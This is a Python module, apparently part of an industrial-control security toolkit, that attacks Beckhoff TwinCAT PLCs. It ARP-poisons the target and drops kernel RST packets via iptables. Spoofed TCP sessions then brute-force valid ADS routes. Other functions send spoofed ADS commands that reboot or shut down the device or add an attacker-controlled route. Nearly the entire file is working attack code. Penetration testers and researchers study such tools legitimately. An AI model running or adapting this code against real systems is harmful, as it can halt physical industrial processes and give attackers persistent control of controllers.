"""Beckhoff ADS route brute-forcer via ARP spoofing (Linux only, scapy).

Ported from BeckhoffRouteSpoofer.py by Photubias (Tijl Deneut).

This module brute-forces known ADS routes using ARP cache poisoning,
kernel RST suppression (iptables), and spoofed TCP connections to
communicate with TwinCAT devices. **Linux only** — requires root, scapy,
and iptables.
"""

from __future__ import annotations

import os
import random
import socket
import struct
import subprocess
import sys
import time
from binascii import hexlify, unhexlify
from typing import TYPE_CHECKING

from icstool.core.bytes import (
    get_netid_as_string,
    ip_to_hex,
    reverse_bytes,
)

if TYPE_CHECKING:
    pass

ADS_PORT = 48898
TIMEOUT = 1


def _require_linux() -> None:
    """Abort if not running on Linux."""
    if os.name == "nt":
        raise SystemExit(
            "Route spoofing requires Linux — ARP poisoning, iptables, "
            "and raw sockets are not supported on Windows."
        )


def _load_scapy():
    """Import scapy lazily, with helpful error message on failure."""
    try:
        from scapy.config import conf
        conf.ipv6_enabled = False
        import scapy.all as scapy_all
        scapy_all.conf.verb = 0
        return scapy_all
    except ImportError:
        raise SystemExit(
            "scapy is required for route spoofing. "
            "Install with: pip install icstool[spoof]"
        )


def _convert_int(value: int, length: int) -> str:
    """Pack integer as little-endian hex, truncated to *length* chars."""
    return struct.pack("<I", value).hex()[:length]


def get_remote_mac(target_ip: str) -> str:
    """Resolve a remote IP to its MAC address via ARP table.

    Sends a single ping then reads the neighbour table.

    Args:
        target_ip: IPv4 address of the target.

    Returns:
        MAC address string (colon-separated).

    Raises:
        SystemExit: If MAC cannot be resolved.
    """
    _require_linux()
    os.system(f"ping -c 1 -W 1 {target_ip} > /dev/null 2>&1")
    import re
    proc = subprocess.Popen(
        f'ip neigh show {target_ip} | cut -d" " -f5',
        shell=True,
        stdout=subprocess.PIPE,
    )
    lines = proc.stdout.readlines() if proc.stdout else []
    if not lines:
        raise SystemExit(
            f"Cannot resolve MAC for {target_ip} — is it reachable?"
        )
    match = re.findall(
        r"(([a-f\d]{1,2}:){5}[a-f\d]{1,2})",
        lines[0].decode(errors="ignore").replace("-", ":"),
    )
    if not match:
        raise SystemExit(
            f"Cannot resolve MAC for {target_ip} from ARP table."
        )
    return match[0][0]


def get_ip_range(cidr: str) -> list[str]:
    """Expand a CIDR notation to a list of host addresses.

    Excludes network and broadcast addresses.

    Args:
        cidr: CIDR string, e.g. ``'192.168.1.0/24'``.

    Returns:
        List of IPv4 address strings.
    """
    ip_str, prefix = cidr.split("/")
    host_bits = 32 - int(prefix)
    network = struct.unpack(">I", socket.inet_aton(ip_str))[0]
    start = (network >> host_bits) << host_bits
    end = start | ((1 << host_bits) - 1)
    return [
        socket.inet_ntoa(struct.pack(">I", x))
        for x in range(start + 1, end)
    ]


def get_default_gateway() -> str | None:
    """Read the default gateway from /proc/net/route (Linux only).

    Returns:
        Gateway IP string, or None if not found.
    """
    try:
        with open("/proc/net/route") as fh:
            for line in fh:
                fields = line.strip().split()
                if fields[1] != "00000000" or not int(fields[3], 16) & 2:
                    continue
                return socket.inet_ntoa(
                    struct.pack("<L", int(fields[2], 16))
                )
    except FileNotFoundError:
        return None
    return None


def get_udp_info(
    adapter_ip: str,
    target_ip: str,
) -> str | None:
    """Query target's TwinCAT info via UDP and return the AMS Net ID.

    Uses scapy to craft and send a TwinCAT discovery packet on UDP 48899.

    Args:
        adapter_ip: Local IP address to embed as source Net ID.
        target_ip: Target Beckhoff device IP.

    Returns:
        Dotted AMS Net ID string, or None on failure.
    """
    scapy = _load_scapy()

    data_hex = (
        "03661471 0000000001000000"
        + ip_to_hex(adapter_ip + ".1.1")
        + "1027 00000000"
    )
    ip_pkt = scapy.IP(dst=target_ip)
    udp_pkt = scapy.UDP(
        sport=random.randint(1024, 65535), dport=48899
    )
    raw = scapy.Raw(load=unhexlify(data_hex.replace(" ", "")))
    resp = scapy.sr1(ip_pkt / udp_pkt / raw, timeout=TIMEOUT)
    if resp is None:
        print("[!] Device not responding to TwinCAT discovery.")
        return None

    hexdata = resp.load.hex().encode()
    net_id = hexdata[24:36]
    name_len = int(hexdata[54:56] + hexdata[52:54], 16)
    name = resp.load[28 : 27 + name_len].decode(errors="ignore")

    i = (27 + name_len) * 2 + 18
    kernel = "{}.{}.{}".format(
        int(reverse_bytes(hexdata[i : i + 8]), 16),
        int(reverse_bytes(hexdata[i + 8 : i + 16]), 16),
        int(reverse_bytes(hexdata[i + 16 : i + 24]), 16),
    )
    i = i + 24 + 528
    tc_ver = "{}.{}.{}".format(
        int(hexdata[i : i + 2], 16),
        int(hexdata[i + 2 : i + 4], 16),
        int(reverse_bytes(hexdata[i + 4 : i + 8]), 16),
    )
    print(
        f"[+] IP: {target_ip}, NAME: {name}, "
        f"RNETID: {get_netid_as_string(net_id)}, "
        f"TCVer: {tc_ver}, Winver: {kernel}"
    )
    return get_netid_as_string(net_id)


def configure_iptables(dst_ip: str, *, enable: bool = True) -> None:
    """Add or remove an iptables rule to drop outgoing RST packets.

    The Linux kernel sends automatic RST for unexpected SYN/ACK; this
    rule suppresses them so scapy TCP sessions can complete.

    Args:
        dst_ip: Destination IP to filter.
        enable: If True, add the DROP rule; if False, remove it.
    """
    _require_linux()
    if not enable:
        subprocess.Popen(
            f"iptables -D OUTPUT -p tcp -m tcp "
            f"--tcp-flags RST RST -j DROP -d {dst_ip}",
            shell=True,
            stdout=subprocess.PIPE,
        )
        return

    proc = subprocess.Popen(
        'iptables -S OUTPUT | grep tcp | grep "RST RST" '
        "| grep DROP | wc -l",
        shell=True,
        stdout=subprocess.PIPE,
    )
    lines = proc.stdout.readlines() if proc.stdout else []
    if lines and int(lines[0]) == 0:
        print("[+] Configuring iptables (dropping kernel RST packets)")
        subprocess.Popen(
            f"iptables -A OUTPUT -p tcp --tcp-flags RST RST "
            f"-d {dst_ip} -j DROP",
            shell=True,
            stdout=subprocess.PIPE,
        )


def arp_spoof(
    src_mac: str,
    spoof_ip: str,
    target_ip: str,
    duration: int,
) -> None:
    """Continuously ARP-spoof *target_ip* to believe we are *spoof_ip*.

    Sends ARP replies for *duration* seconds, then restores the table.
    Designed to run in a background thread.

    Args:
        src_mac: Our MAC address.
        spoof_ip: IP to impersonate.
        target_ip: Victim IP to poison.
        duration: Seconds to maintain the spoof.
    """
    scapy = _load_scapy()
    dst_mac = get_remote_mac(target_ip)
    arp = scapy.ARP(
        op=2, pdst=target_ip, hwdst=dst_mac,
        psrc=spoof_ip, hwsrc=src_mac,
    )
    try:
        for _ in range(duration):
            scapy.send(arp)
            time.sleep(1)
    except Exception:
        pass
    # Restore real ARP entry
    try:
        fix = scapy.ARP(
            op=2, hwdst="ff:ff:ff:ff:ff:ff",
            pdst=target_ip, hwsrc=dst_mac, psrc=target_ip,
        )
        scapy.send(fix, count=5)
    except Exception:
        pass


def spoof_tcp_packet(
    src_ip: str,
    target_ip: str,
    dst_port: int,
    payload: bytes,
) -> object | None:
    """Perform a full spoofed TCP handshake and send payload.

    Uses scapy to craft SYN, handle SYN/ACK, send data, and FIN.

    Args:
        src_ip: Spoofed source IP address.
        target_ip: Destination IP address.
        dst_port: Destination TCP port.
        payload: Raw bytes to send after handshake.

    Returns:
        Scapy response packet, or None on failure.
    """
    scapy = _load_scapy()
    sport = random.randint(1024, 65535)
    ip = scapy.IP(src=src_ip, dst=target_ip)
    syn = scapy.TCP(sport=sport, dport=dst_port, flags="S", seq=1000)
    synack = scapy.sr1(ip / syn, timeout=TIMEOUT)
    if synack is None:
        return None

    ack = scapy.TCP(
        sport=sport, dport=dst_port, flags="A",
        seq=synack.ack, ack=synack.seq + 1,
    )
    scapy.send(ip / ack)

    tcp_data = scapy.TCP(
        sport=sport, dport=dst_port, flags="PA",
        seq=synack.ack, ack=synack.seq + 1,
    )
    raw = scapy.Raw(load=payload)
    resp = scapy.sr1(ip / tcp_data / raw, timeout=TIMEOUT)

    # FIN
    if resp is not None:
        fin = scapy.TCP(
            sport=sport, dport=dst_port, flags="FA",
            seq=resp.ack, ack=resp.seq + 1,
        )
        finack = scapy.sr1(ip / fin, timeout=TIMEOUT)
        if finack is not None:
            last_ack = scapy.TCP(
                sport=sport, dport=dst_port, flags="A",
                seq=finack.ack, ack=finack.seq + 1,
            )
            scapy.send(ip / last_ack)

    return resp


def get_result(
    src_ip: str,
    target_ip: str,
    rnetid: str,
) -> bool:
    """Test if a spoofed IP has a valid ADS route on the target.

    Sends an ADS GetInfo request via spoofed TCP and checks response.

    Args:
        src_ip: IP to spoof as source.
        target_ip: Target Beckhoff device IP.
        rnetid: Remote AMS Net ID (dotted).

    Returns:
        True if the route is valid and the device responds.
    """
    scapy = _load_scapy()
    packet = "000020000000"
    packet += ip_to_hex(rnetid)
    packet += "1027"
    packet += ip_to_hex(src_ip + ".1.1")
    packet += "018004000400000000000000000009000000"
    data = unhexlify(packet.replace(" ", ""))

    resp = spoof_tcp_packet(src_ip, target_ip, ADS_PORT, data)
    if resp is None:
        return False

    raw_layer = resp.getlayer(scapy.Raw)
    if raw_layer is None:
        return False

    resp_hex = hexlify(raw_layer.load)
    state = resp_hex[-8:-6]
    if state == b"06":
        print(f"[+] {src_ip} works! Device in STOP mode")
    elif state == b"0f":
        print(f"[+] {src_ip} works! Device in CONFIG mode")
    else:
        print(f"[+] {src_ip} works! Device in RUN mode")
    return True


def restart_device(
    src_ip: str,
    target_ip: str,
    rnetid: str,
) -> None:
    """Reboot the target Beckhoff device via a spoofed ADS packet.

    Args:
        src_ip: Spoofed source IP.
        target_ip: Target device IP.
        rnetid: Remote AMS Net ID (dotted).
    """
    packet = "0000 2c00 0000"
    packet += ip_to_hex(rnetid)
    packet += "1027"
    packet += ip_to_hex(src_ip + ".1.1")
    packet += (
        "f280 0500 0400 0c000000 00000000 "
        "5d220000 0c00 0100 04000000 00000000"
    )
    data = bytes.fromhex(packet.replace(" ", ""))
    resp = spoof_tcp_packet(src_ip, target_ip, ADS_PORT, data)
    if resp is not None:
        print("[+] Reboot command sent successfully")
    else:
        print("[!] No response — ARP spoofing may have expired")


def shutdown_device(
    src_ip: str,
    target_ip: str,
    rnetid: str,
) -> None:
    """Shut down the target Beckhoff device via a spoofed ADS packet.

    Args:
        src_ip: Spoofed source IP.
        target_ip: Target device IP.
        rnetid: Remote AMS Net ID (dotted).
    """
    packet = "0000 2c00 0000"
    packet += ip_to_hex(rnetid)
    packet += "1027"
    packet += ip_to_hex(src_ip + ".1.1")
    packet += (
        "f280 0500 0400 0c000000 00000000 "
        "5d220000 0c00 0000 04000000 00000000"
    )
    data = bytes.fromhex(packet.replace(" ", ""))
    resp = spoof_tcp_packet(src_ip, target_ip, ADS_PORT, data)
    if resp is not None:
        print("[+] Shutdown command sent successfully")
    else:
        print("[!] No response — ARP spoofing may have expired")


def add_route(
    src_ip: str,
    target_ip: str,
    rnetid: str,
    route_name: str = "TEST",
) -> bool:
    """Add an ADS route on the target device via spoofed TCP.

    Opens a temporary TCP listener on port 48898 (required since
    TwinCAT 3 build 4024+) and sends the route-add command.

    Args:
        src_ip: Spoofed source IP (will be the route endpoint).
        target_ip: Target Beckhoff device IP.
        rnetid: Remote AMS Net ID (dotted).
        route_name: Name for the new route.

    Returns:
        True if route was added successfully.
    """
    scapy = _load_scapy()
    new_netid = src_ip + ".1.1"

    # Open TCP listener — TC3 4024+ requires port 48898 reachable
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[!] Opening TCP socket on {src_ip}:48898")
    listener.bind((src_ip, 48898))
    listener.listen(1)

    try:
        s_data = ip_to_hex(new_netid)
        s_data += (
            "0100 0000 0000 0000 0000 0000 0000 0000 "
            "0000 0000 0000 0000 0000"
        ).replace(" ", "")
        s_data += _convert_int(len(src_ip) + 1, 8)
        s_data += _convert_int(len(route_name) + 1, 8)
        s_data += "00000000"
        s_data += src_ip.encode().hex() + "00"
        s_data += route_name.upper().encode().hex() + "00"

        packet = "0000"
        packet += _convert_int(
            0x58 + len(src_ip) + len(route_name) + 2, 8
        )
        packet += ip_to_hex(rnetid)
        packet += "1027"
        packet += ip_to_hex(src_ip + ".1.1")
        packet += "5e01 0300 0400 ".replace(" ", "")
        packet += _convert_int(
            0x38 + len(src_ip) + len(route_name) + 2, 8
        )
        packet += "00000000 040001ff2103000000000000".replace(" ", "")
        packet += _convert_int(
            0x2C + len(src_ip) + len(route_name) + 2, 8
        )
        packet += s_data

        resp = spoof_tcp_packet(
            src_ip, target_ip, ADS_PORT,
            bytes.fromhex(packet.replace(" ", "")),
        )
        raw = resp.getlayer(scapy.Raw) if resp else None
        if raw is None:
            print("[-] Failed — ARP spoof may have timed out")
            return False
        print(f"[+] Route '{route_name}' for {src_ip} added")
        return True
    finally:
        listener.close()


def brute_force_routes(
    adapter_ip: str,
    adapter_mac: str,
    target_ip: str,
    cidr: str | None = None,
    rnetid: str | None = None,
) -> str | None:
    """Brute-force ADS routes by ARP-spoofing each IP in a subnet.

    Iterates through each IP in the given CIDR range, ARP-spoofs the
    target into thinking we hold that IP, then tests if an ADS route
    exists for it.

    Args:
        adapter_ip: Our real local IP address.
        adapter_mac: Our MAC address.
        target_ip: Target Beckhoff device IP.
        cidr: Subnet to scan (e.g. ``'192.168.1.0/24'``).
        rnetid: AMS Net ID override. Auto-detected if None.

    Returns:
        The working spoofed IP, or None if none found.
    """
    import _thread

    _require_linux()
    scapy = _load_scapy()

    if rnetid is None:
        rnetid = get_udp_info(adapter_ip, target_ip)
        if rnetid is None:
            rnetid = target_ip + ".1.1"

    if cidr is None:
        prefix = adapter_ip[: adapter_ip.rfind(".")]
        cidr = f"{prefix}.0/24"

    ip_list = get_ip_range(cidr)
    gateway = get_default_gateway()

    configure_iptables(target_ip, enable=True)

    if gateway and gateway not in ip_list:
        print(
            f"[!] Gateway ({gateway}) not in range, "
            "spoofing it too"
        )
        _thread.start_new_thread(
            arp_spoof, (adapter_mac, gateway, target_ip, 999)
        )

    working_ip: str | None = None
    try:
        for ip in ip_list:
            print(f"Trying: {ip}")
            _thread.start_new_thread(
                arp_spoof, (adapter_mac, ip, target_ip, 5)
            )
            time.sleep(0.5)
            if get_result(ip, target_ip, rnetid):
                working_ip = ip
                break
    except KeyboardInterrupt:
        print("-- Interrupted, cleaning up")

    print("\n[!] Restoring ARP tables")
    time.sleep(4)
    configure_iptables(target_ip, enable=False)
    return working_ip
